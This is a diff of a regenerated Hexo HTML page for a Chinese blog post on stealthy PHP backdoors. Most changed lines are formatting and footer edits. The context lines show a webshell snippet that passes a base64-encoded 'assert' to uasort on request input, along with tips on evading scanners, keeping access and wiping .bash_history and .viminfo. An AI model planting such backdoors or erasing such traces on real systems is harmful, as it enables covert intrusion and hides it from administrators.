@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://ph0rse.me">
   <title>奇淫异巧之PHP后门 | Ph0rse&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -44,7 +44,7 @@
   
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -208,7 +208,7 @@ $arr = array(&apos;test&apos;, $_REQUEST[&apos;pass&apos;]);
 uasort($arr, base64_decode($e));
 </code></pre><p>$_REQUEST[‘e’]的话，传递GET或者POST参数都可以。</p>
 <p>uasort函数在手册里这样定义：</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201806251646_69.png" alt=""><br>如果我们传入的比较函数是assert的话，就会产生代码执行。</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201806251646_69.png" alt><br>如果我们传入的比较函数是assert的话，就会产生代码执行。</p>
 <p>先将参数保存为一个数组，传入’assert’的base64编码，使用uasort函数调用即可。</p>
 <p>由此方法引申出的姿势有：<br><br>一. 换为uksort函数：</p>
 <pre><code>&lt;?php
@@ -262,7 +262,7 @@ $re = $st-&gt;frtch
 <h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><h4 id="真正的后门，要靠系统层"><a href="#真正的后门，要靠系统层" class="headerlink" title="真正的后门，要靠系统层"></a>真正的后门，要靠系统层</h4><p>对于PHP后门来说，如果能做到隐蔽性，不会被D盾等工具自动检测出来。人工查看时，一时半会儿也看不出有问题，其实就够了。</p>
 <p>受限于运维的日志审查，通过PHP去进行后渗透不太现实，PHP后门最大的意义在于，留有一个通道。等其它通道关闭或者网站迁移（总要移代码吧）时，能够维持对目标站的控制。</p>
 <p>而真正的后渗透操作，还是要考系统层的其它技巧，比如shift后门，ssh后门，注册表木马等等~这些都是后话了~</p>
-<h4 id="擦除痕迹"><a href="#擦除痕迹" class="headerlink" title="擦除痕迹"></a>擦除痕迹</h4><p>想要让后面隐蔽，除了以上几点，还要清理好文件操作的痕迹。在Linux下就是删除.bash_history和.viminfo的记录，这些记录显示了你前段时间执行了哪些命令，修改了哪些文本。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251657_589.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251658_703.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_727.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_103.png" alt=""></p>
+<h4 id="擦除痕迹"><a href="#擦除痕迹" class="headerlink" title="擦除痕迹"></a>擦除痕迹</h4><p>想要让后面隐蔽，除了以上几点，还要清理好文件操作的痕迹。在Linux下就是删除.bash_history和.viminfo的记录，这些记录显示了你前段时间执行了哪些命令，修改了哪些文本。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251657_589.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251658_703.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_727.png" alt><br><img src="http://ovc0f0a85.bkt.clouddn.com/201806251700_103.png" alt></p>
 <p>而在windows下，就是在注册表中做一些操作~</p>
 <p>上一篇文章突然激起了写作欲，但受限于时间，没能去一步一步截图。当然，这篇文章主要是想阐述思路，比如回调函数的妙用，PHP后门应该是什么样~</p>
 <p>文中介绍的姿势是我自己实战或者打比赛常用的，搜集而成，并非原创。但可以保证，这些姿势我都试过，复现起来是完全OK的~</p>
@@ -371,11 +371,11 @@ $re = $st-&gt;frtch
   
 <nav id="article-nav">
   
-    <a href="/2018/08/05/重回周报/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/10/26/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          重回周报
+          Hello World
         
       </div>
     </a>
@@ -441,7 +441,7 @@ gitment.render('gitment-ctn')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 Ph0rse
+    		&copy; 2019 Ph0rse
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -549,7 +549,7 @@ MathJax.Hub.Queue(function() {
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            缺失模块。<br>1、请确保node版本大于6.2<br>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
             3、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
